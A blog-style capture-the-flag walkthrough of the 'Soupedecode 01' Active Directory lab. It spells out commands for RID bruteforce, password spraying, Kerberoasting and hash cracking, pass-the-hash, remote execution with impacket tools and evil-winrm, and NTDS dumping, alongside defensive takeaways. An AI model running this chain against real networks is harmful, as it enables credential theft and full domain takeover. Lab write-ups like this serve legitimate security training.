---
layout: post
title: "HackTheBox Soupedcode Walkthrough "
date: 2025-11-30
categories: [tryhackme, walkthrough]
tags: [ctf, http,linux, rce, tryhackme, htb, writeups, Soupedcode, labs, nmap, soupedcode, rid, window, active direcotry, smnb, smb, impacket, user.txt, nxc, Kerberoasting, john, evilrm, hashcat, impacket-smbclient,  ]
author: h4ck3rfirst
excerpt: "Complete walkthrough of the HackTheBox Pentest Lab machine 'Soupedcode hackthebox'"
---

# TryHackMe — Soupedecode 01
**Difficulty:** Easy | **OS:** Windows (Active Directory) | **Platform:** TryHackMe  
**Category:** Active Directory 

---

## Synopsis

**Soupedecode 01** is a beginner-friendly Active Directory room that walks through a complete, realistic AD attack chain using only well-known techniques and no exploits. Starting from zero credentials, the path moves through guest SMB access → RID bruteforce for usernames → password spraying → Kerberoasting → backup share access → NTLM hash spraying → Domain Admin via Pass-the-Hash.

**Attack Chain Overview:**

```
[No Creds]
    │
    ▼ Guest SMB + RID Bruteforce
[Username List]
    │
    ▼ Password Spray (user:user)
[ybob317 : ybob317]  →  user.txt 🚩
    │
    ▼ Kerberoasting
[file_svc : Password123!!]
    │
    ▼ Backup Share → NTLM Hashes
[backup_extract.txt]
    │
    ▼ Hash Spray → Pass-the-Hash
[FileServer$ → Enterprise Admin]  →  root.txt 🚩
```

**No CVEs required.** Every step abuses a legitimate Windows/AD feature that is simply misconfigured.

---

## Skills Covered

- AD enumeration from zero credentials via guest SMB
- RID bruteforce for domain user enumeration
- Password spraying (username-as-password pattern)
- Kerberoasting TGS hash extraction and cracking
- SMB share enumeration and access
- NTLM hash spraying (Pass-the-Hash)
- Administrative access via computer account membership in Enterprise Admins

---

## Reconnaissance

### Nmap Port Scan

```bash
nmap -sCV --min-rate 5000 -T4 -p- soupedecode.local
```

**Key open ports:**

| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | Domain name resolution |
| 88 | Kerberos | Confirms Active Directory |
| 389 / 3268 | LDAP / Global Catalog | AD queries possible |
| 445 | SMB | File sharing — primary attack surface |
| 3389 | RDP | Remote Desktop (useful later) |
| 9389 | .NET Message Framing | AD Web Services |

> **Key observation:** The combination of ports 53, 88, 389, and 445 is the unmistakable fingerprint of a **Domain Controller**. The nmap output directly reveals:
> - **Hostname:** `DC01`  
> - **Domain:** `SOUPEDECODE.LOCAL`  
> - **OS:** Windows Server 2022 Build 20348

Add to `/etc/hosts` before proceeding:
```bash
echo "10.10.X.X DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
```

> **Note on SMB signing:** The scan shows `Message signing enabled and required`. This means **SMB relay attacks will not work** here — we cannot relay captured NTLM hashes for lateral movement via tools like Responder + ntlmrelayx. We must use Pass-the-Hash directly instead.

---

## Enumeration

### SMB — Guest Access

The first thing to check on any AD box is whether the **guest account** is enabled and what it can access. This costs nothing and frequently reveals significant information.

```bash
nxc smb $ip -u guest -p '' --shares
```

**Output:**
```
SMB  DC01  [+] SOUPEDECODE.LOCAL\guest:
SMB  DC01  Share        Permissions   Remark
SMB  DC01  -----        -----------   ------
SMB  DC01  ADMIN$                     Remote Admin
SMB  DC01  backup                     
SMB  DC01  C$                         Default share
SMB  DC01  IPC$         READ          Remote IPC
SMB  DC01  NETLOGON                   Logon server share
SMB  DC01  SYSVOL                     Logon server share
SMB  DC01  Users
```

**What this tells us:**
- Guest login is **enabled** — a misconfiguration
- `IPC$` is readable — this is the critical one; it enables RID bruteforce
- `backup` share exists — no access yet, but it's a target
- `Users` share exists — no access yet

> **Why IPC$ matters:** The IPC$ (Inter-Process Communication) share is used for named pipe communication. Read access to it allows unauthenticated users to make MSRPC calls, including querying the SAM database via the SAMR protocol to enumerate domain users and groups — this is the foundation of RID bruteforce.

---

### RID Bruteforce — Username Enumeration

Every AD object (user, group, computer) has a unique **Security Identifier (SID)**. The last component of the SID is the **RID (Relative Identifier)**. Well-known RIDs are predictable (e.g., 500 = Administrator, 501 = Guest), and regular user accounts are assigned sequentially starting from 1000.

By iterating RIDs and querying what object owns each one via the SAMR protocol over IPC$, we can enumerate all domain users without any credentials:

```bash
# Enumerate and save clean username list in one command
nxc smb $ip -u guest -p '' --rid-brute 3000 \
  | grep SidTypeUser \
  | cut -d'\' -f2 \
  | cut -d' ' -f1 > username-rid.txt

# Verify
wc -l username-rid.txt
head username-rid.txt
```

**Alternative tools for RID bruteforce:**
```bash
# Using lookupsid.py (impacket) — same result, different syntax
impacket-lookupsid 'SOUPEDECODE.LOCAL/guest:@DC01.SOUPEDECODE.LOCAL' 3000 \
  | grep SidTypeUser \
  | awk -F'\\ ' '{print $2}' \
  | cut -d' ' -f1 > username-rid.txt

# Using enum4linux-ng
enum4linux-ng -A -u guest -p '' DC01.SOUPEDECODE.LOCAL
```

> **Why RID 3000?** Default user accounts start at RID 1000. In a domain with hundreds of users, 3000 is a safe upper bound that ensures you catch everyone without wasting too many requests on empty RIDs.

---

### LDAP Enumeration (Attempted)

With valid credentials later, LDAP can be queried for richer AD information — group memberships, ACLs, GPOs, etc. We also attempted BloodHound collection:

```bash
nxc ldap $ip -u ybob317 -p ybob317
# [+] SOUPEDECODE.LOCAL\ybob317:ybob317

# BloodHound collection attempt — failed (DNS resolution issue)
nxc ldap $ip -u ybob317 -p ybob317 --bloodhound --collection All
# [-] Could not find a domain controller. Consider specifying a domain and/or DNS server.
```

> **Fix for BloodHound DNS issue:** This error occurs when the tool cannot resolve the DC by name. Solve it by specifying the domain controller DNS explicitly:
> ```bash
> nxc ldap $ip -u ybob317 -p ybob317 --bloodhound --collection All \
>   --dns-server $ip --domain SOUPEDECODE.LOCAL
> ```
> On a real engagement, BloodHound would map all attack paths visually — very useful for more complex environments.

---

## User Flag — Password Spraying

### Strategy: Username = Password

Before trying complex wordlists, always check the lowest-effort options first. A common weak password pattern is users setting their password to match their username. This is trivially testable at scale using `--no-bruteforce` (pairs each user with the password at the same line position — so user 1 tries password 1, user 2 tries password 2, etc.).

```bash
# Use the same file for both usernames AND passwords
nxc smb $ip \
  -u username-rid.txt \
  -p username-rid.txt \
  --no-bruteforce \
  --continue-on-success \
  | grep '\[+\]'
```

**Result:**
```
SMB  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

**Other password spray patterns to try (in order of likelihood):**

| Pattern | Example | Command |
|---------|---------|---------|
| Username = Password | `ybob317:ybob317` | `-u users.txt -p users.txt --no-bruteforce` |
| Domain name | `Soupedecode1` | `-u users.txt -p 'Soupedecode1'` |
| Season + Year | `Spring2024!` | `-u users.txt -p 'Spring2024!'` |
| Company name | `Company123!` | `-u users.txt -p 'Company123!'` |
| Welcome patterns | `Welcome1!` | `-u users.txt -p 'Welcome1!'` |

> **⚠️ Lockout Warning:** Always check the domain password policy before spraying. Spraying too many passwords per user risks locking accounts. Use `--continue-on-success` to avoid re-trying valid accounts, and limit attempts to 1–2 passwords per user per run unless you've confirmed there's no lockout policy.
>
> Check lockout policy:
> ```bash
> nxc smb $ip -u guest -p '' --pass-pol
> ```

### ASREPRoasting (Checked, Not Applicable)

Before spraying, also check for **ASREPRoastable** accounts — users with Kerberos pre-authentication disabled. These accounts return a hash without any credentials:

```bash
# Check for ASREPRoastable accounts
impacket-GetNPUsers SOUPEDECODE.LOCAL/ \
  -usersfile username-rid.txt \
  -no-pass \
  -dc-ip $ip \
  -outputfile asrep_hashes.txt

# No vulnerable accounts found in this room
```

### Retrieving the User Flag

With `ybob317:ybob317`, we now have read access to the `Users` share:

```bash
nxc smb $ip -u ybob317 -p ybob317 --shares
# Users  READ

impacket-smbclient 'SOUPEDECODE.LOCAL/ybob317:ybob317@DC01.SOUPEDECODE.LOCAL'
```

```
# use Users
# cd ybob317/Desktop
# ls
# get user.txt
```

🚩 **User flag obtained.**

---

## Privilege Escalation

### Step 1 — Kerberoasting

With valid domain credentials, we can request **TGS (Ticket Granting Service)** tickets for any service account that has an SPN (Service Principal Name) registered. These tickets are encrypted with the service account's password hash and can be cracked offline.

```bash
impacket-GetUserSPNs \
  -request \
  -outputfile kerberoastables.txt \
  'SOUPEDECODE.LOCAL/ybob317:ybob317' \
  -dc-ip $ip
```

**SPNs Found:**

| SPN | Account | Password Last Set |
|-----|---------|-------------------|
| FTP/FileServer | `file_svc` | 2024-06-17 |
| FW/ProxyServer | `firewall_svc` | 2024-06-17 |
| HTTP/BackupServer | `backup_svc` | 2024-06-17 |
| HTTP/WebServer | `web_svc` | 2024-06-17 |
| HTTPS/MonitoringServer | `monitoring_svc` | 2024-06-17 |

> **Why Kerberoasting works:** Service accounts frequently have weak passwords because they are sometimes managed manually and not subject to the same rotation policies as user accounts. Attackers request a TGS ticket (which any authenticated domain user can do — it's a normal Kerberos operation), extract the encrypted blob, and crack it offline at full GPU speed without touching the DC again.

**Cracking the hashes:**

```bash
# Method 1: John the Ripper (your method)
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Method 2: Hashcat (mode 13100 = TGS-REP RC4)
hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt

# View cracked results
john kerberoastables.txt --show
# OR
hashcat -m 13100 kerberoastables.txt --show
```

**Cracked:** `file_svc : Password123!!`

> **Tip — Which hash cracked?** The room has 5 service accounts. John cracked only one because only `file_svc` has a password in rockyou.txt. The others likely have stronger passwords. In a real engagement, also try targeted wordlists based on company name and known password patterns.

### Step 2 — Confirm file_svc Access

Spray the cracked password against all kerberoastable service accounts to confirm which one it belongs to:

```bash
nxc smb $ip \
  -u file_svc firewall_svc backup_svc web_svc monitoring_svc \
  -p 'Password123!!' \
  --continue-on-success \
  | grep '\[+\]'

# [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
```

Check share access — `backup` share is now readable:
```bash
nxc smb $ip -u file_svc -p 'Password123!!' --shares
# backup  READ
```

### Step 3 — Harvesting NTLM Hashes from Backup Share

```bash
impacket-smbclient 'SOUPEDECODE.LOCAL/file_svc:Password123!!@DC01.SOUPEDECODE.LOCAL'
```

```
# use backup
# ls
-rw-rw-rw-  892  backup_extract.txt
# get backup_extract.txt
```

**Contents of `backup_extract.txt`:**
```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e3f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

> **Understanding the format:** This is the classic `/etc/shadow`-equivalent for Windows — a **NTDS dump extract** (format: `username:RID:LM_hash:NT_hash:::`). The LM hash `aad3b435b51404eeaad3b435b51404ee` is the universal empty/disabled LM hash in Windows (LM hashing is disabled by default since Vista). The **NT hash** (4th field) is what we actually need.

**Parse the file — your clean method:**

```bash
# Extract usernames (clean, your method)
grep -o '^[^:]*\$' backup_extract.txt | sed 's/\$//'

# Extract for spray — method 1 (standard)
cut -d':' -f1 backup_extract.txt > backup_users.txt
cut -d':' -f4 backup_extract.txt > backup_hashes.txt

# Extract for spray — method 2 (one-liner with paste)
paste -d: \
  <(cut -d':' -f1 backup_extract.txt) \
  <(cut -d':' -f4 backup_extract.txt) > user_hash_pairs.txt
```

### Step 4 — NTLM Hash Spraying (Pass-the-Hash)

With a list of computer account hashes, we spray them all against SMB to find which ones are valid. This is **Pass-the-Hash** — Windows NTLM authentication uses the hash directly, so cracking is not needed:

```bash
nxc smb $ip \
  -u backup_users.txt \
  -H backup_hashes.txt \
  --no-bruteforce \
  --continue-on-success \
  | grep '\[+\]'
```

**Result:**
```
SMB  DC01  [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

> **Why `(Pwn3d!)`?** NetExec marks an account as `Pwn3d!` when it has local administrator access on the target — meaning it can access `ADMIN$` or `C$` shares. For a Domain Controller, this effectively means full domain control.

**Why does a computer account have admin rights?** After getting root, we can verify:

```powershell
# On the DC (via smbexec)
powershell -c "(Get-ADComputer 'FileServer$' -Properties MemberOf).MemberOf"
# CN=Enterprise Admins,CN=Users,DC=SOUPEDECODE,DC=LOCAL
```

`FileServer$` is a **member of Enterprise Admins** — the highest privilege group in an AD forest. This is a severe misconfiguration; computer accounts should never be in privileged groups.

---

## Root Flag — Multiple Methods

### Method 1 — smbexec.py (Your Method — Command Execution)

```bash
impacket-smbexec \
  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL'

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

🚩 **Root flag obtained.**

> **How smbexec works:** It creates a temporary Windows service that executes commands via SMB, reading output by writing it to a temp file. It's slightly noisier than psexec but doesn't drop a binary on disk.

### Method 2 — smbclient.py (Direct File Retrieval — Your Method)

No need for a shell if you just need the flag file:

```bash
impacket-smbclient \
  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL'

# use C$
# cd Users/Administrator/Desktop
# get root.txt
```

### Method 3 — wmiexec.py (Stealthier Shell)

```bash
impacket-wmiexec \
  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL'

C:\> type C:\Users\Administrator\Desktop\root.txt
```

> **wmiexec vs smbexec:** wmiexec uses WMI (Windows Management Instrumentation) over DCOM port 135, leaving a different artifact trail than SMB-based execution. Neither is "silent" but wmiexec avoids touching the Windows Service Manager.

### Method 4 — Evil-WinRM (RDP/WinRM, if enabled)

Since port 3389 (RDP) was open, and if WinRM (5985) were available, full interactive sessions are possible:

```bash
# WinRM with hash
evil-winrm -i $ip \
  -u 'FileServer$' \
  -H e41da7e79a4c76dbd9cf79d1cb325559

# RDP with hash (using xfreerdp)
xfreerdp /v:$ip \
  /u:'FileServer$' \
  /pth:e41da7e79a4c76dbd9cf79d1cb325559 \
  /d:SOUPEDECODE.LOCAL
```

### Method 5 — Secretsdump (Dump Full NTDS)

With `Pwn3d!` access we can dump the entire AD database:

```bash
impacket-secretsdump \
  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL'

# Dumps: SAM, LSA secrets, NTDS.dit contents
# Includes: Administrator:500:...:NTLM_HASH:::
```

This gives you every user's NT hash in the domain — the crown jewels of an AD compromise.

---

## Concept Deep-Dives

### What is RID Bruteforce?

Windows identifies every security principal (users, groups, computers) with a SID. The SID has the form `S-1-5-21-<domain>-<RID>`. By querying the SAMR protocol over IPC$ for RIDs 500 through N, an attacker maps RIDs to account names. This works because the SAMR protocol allows any user with IPC$ READ to call `LookupRids()` — no additional privileges needed. It's a legitimate protocol function, not an exploit.

**Defense:** Disable the guest account. Restrict anonymous/guest IPC$ access via the `RestrictAnonymous` registry key.

### What is Password Spraying vs. Brute Force?

**Brute force** tries many passwords against one account → triggers lockout.  
**Password spraying** tries one password against many accounts → stays under lockout threshold.

The `--no-bruteforce` flag in nxc pairs username[n] with password[n] — not every combination. This means it tries `user1:pass1`, `user2:pass2`, etc. — effectively a targeted "username = password" check in a single pass.

### What is Kerberoasting?

Kerberos TGS tickets are encrypted with the service account's NT hash. Any authenticated domain user can request a TGS for any SPN — this is by design. The attack extracts the encrypted ticket blob and cracks it offline. The `etype 23` (RC4-HMAC) ticket type is weakest and crackable fastest; modern DCs may use `etype 17/18` (AES) which is much slower to crack.

**Defense:** Use long, random service account passwords (>25 chars). Enable AES-only encryption for SPNs. Consider Managed Service Accounts (gMSA) which rotate passwords automatically.

### What is Pass-the-Hash?

Windows NTLM authentication works by: client sends username → server sends challenge → client responds with HMAC-MD4(NT_hash, challenge). Notice the client never sends the plaintext password — just the hash. Therefore, if you have the NT hash, you can authenticate as that user without ever knowing the password. This is fundamental to NTLM and cannot be "patched" without replacing NTLM entirely.

**Defense:** Use Kerberos instead of NTLM wherever possible. Enable Protected Users security group for admin accounts. Implement PAM (Privileged Access Management). Monitor for NTLM authentication from unusual sources.

---

## Attack Chain Summary

```
[Guest Account — No Creds]
         │
         │  nxc --rid-brute → 500+ usernames
         ▼
[username-rid.txt]
         │
         │  nxc password spray (user:user)
         ▼
[ybob317 : ybob317]
         │  
         │  SMB Users share → ybob317/Desktop/user.txt
         │  🚩 USER FLAG
         │
         │  GetUserSPNs → 5 kerberoastable accounts
         │  john → cracks file_svc : Password123!!
         ▼
[file_svc : Password123!!]
         │
         │  SMB backup share → backup_extract.txt
         │  10 computer account NTLM hashes
         ▼
[backup_extract.txt NTLM hashes]
         │
         │  nxc hash spray → FileServer$ Pwn3d!
         │  FileServer$ ∈ Enterprise Admins
         ▼
[FileServer$ (Enterprise Admin)]
         │
         │  smbexec / smbclient C$ → root.txt
         │  🚩 ROOT FLAG
         ▼
[Full Domain Compromise]
```

---

## Key Takeaways

**1. Guest SMB Access Is Dangerous**  
A guest account with IPC$ read access hands the attacker a full username list at zero cost. Disable guest accounts or restrict IPC$ access on all DCs.

**2. Usernames Are Not Secrets — Passwords Are**  
RID bruteforce is always possible if guest IPC$ access is open. Design your password policy assuming attackers already know all usernames.

**3. Username = Password Is Embarrassingly Common**  
This pattern appears in real-world engagements constantly. Enforce complexity requirements and audit for this specific pattern during provisioning.

**4. Kerberoastable Service Accounts Need Strong Passwords**  
Any account with an SPN and a weak password is owned the moment an attacker gets any domain foothold. Use gMSA (Group Managed Service Accounts) to eliminate this attack surface entirely.

**5. Backup Files Containing Hashes Are Catastrophic**  
`backup_extract.txt` was an NTDS extract left readable on a share. This is equivalent to leaving a copy of `/etc/shadow` world-readable. Treat any file containing hashes as maximally sensitive.

**6. Computer Accounts Can Have Dangerous Privileges**  
`FileServer$` being in Enterprise Admins is a severe misconfiguration that is easily overlooked because most attention focuses on user accounts. Audit group memberships for all object types, including computers and service accounts.

---

## Tools Reference

| Tool | Purpose | Command Pattern |
|------|---------|----------------|
| `nmap` | Port scan | `nmap -sCV -p- $ip` |
| `nxc` / `netexec` | SMB/LDAP Swiss army knife | `nxc smb $ip -u X -p Y --shares` |
| `impacket-GetUserSPNs` | Kerberoasting | `-request -outputfile hashes.txt` |
| `impacket-smbclient` | SMB file access | `'DOMAIN/user:pass@host'` |
| `impacket-smbexec` | Command execution via SMB | `-hashes :NTLM 'DOMAIN/user@host'` |
| `impacket-secretsdump` | Dump AD hashes | `-hashes :NTLM 'DOMAIN/user@host'` |
| `john` | Hash cracking | `--wordlist=rockyou.txt hashes.txt` |
| `hashcat` | Hash cracking (GPU) | `-m 13100 hashes.txt wordlist` |
| `evil-winrm` | WinRM shell | `-i $ip -u user -H hash` |

---

